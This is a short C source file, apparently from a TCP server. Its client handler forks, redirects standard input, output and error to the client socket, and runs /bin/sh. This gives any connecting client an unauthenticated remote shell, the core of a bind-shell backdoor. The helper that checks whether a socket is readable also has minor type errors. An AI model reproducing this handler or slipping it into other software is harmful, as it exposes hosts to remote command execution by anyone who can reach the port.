#include "tcp_server.h"
#include "log.h"
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>


uint8_t fd_is_readable(tcp_server_t *server, tcp_client_t *client)
{
    size_t len = 0;

    ioctl(client->fd, FIONREAD, &len);

    return (len);
}

int handle_client_file_descriptor(tcp_client_t *client)
{
    int pid = fork(), status = 0;

    if (pid == 0) {
        
        dup2(client->fd, 0);
        dup2(client->fd, 1);
        dup2(client->fd, 2);

        char *argv[] = {"/bin/sh", NULL};

        if (execvp("/bin/sh", argv) < 0)
            print_error();
        
        exit(0);
    }

    waitpid(pid, &status, WUNTRACED);
    
    while (!WIFEXITED(status) && !WIFSIGNALED(status))
        waitpid(pid, &status, WUNTRACED);
    
    return (WEXITSTATUS(status) ?  (WEXITSTATUS(status)) : WTERMSIG(status));
}